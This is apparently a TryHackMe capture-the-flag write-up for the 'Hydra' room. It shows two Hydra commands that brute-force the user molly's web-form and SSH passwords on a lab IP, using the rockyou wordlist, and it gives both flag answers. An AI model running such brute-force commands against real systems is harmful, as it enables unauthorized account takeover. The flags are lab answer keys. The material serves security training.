# <div align="center">[Hydra - TryHackMe writeup](https://tryhackme.com/r/room/hydra)</div>

<div align="center">Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials</div>

<div align="center"> <img width="200" height="200" alt="Hydra" src="https://github.com/user-attachments/assets/c4812e0c-6aec-48e2-bfcd-797f3ec9095e"/> </div>

<div align="center"> <img alt="Difficulty: Easy" src="https://img.shields.io/badge/Difficulty-Easy-brightgreen" /> <img alt="OS: Linux" src="https://img.shields.io/badge/OS-Linux-blue" /> </div>

## Use Hydra to bruteforce molly's web password. What is flag 1?

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -t 50
```
```
THM{2673a7dd116de68e85c48ec0b1f2612e
```

## Use Hydra to bruteforce molly's SSH password. What is flag 2?

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 50 
```
```
THM{c8eeb0468febbadea859baeb33b2541b}
```
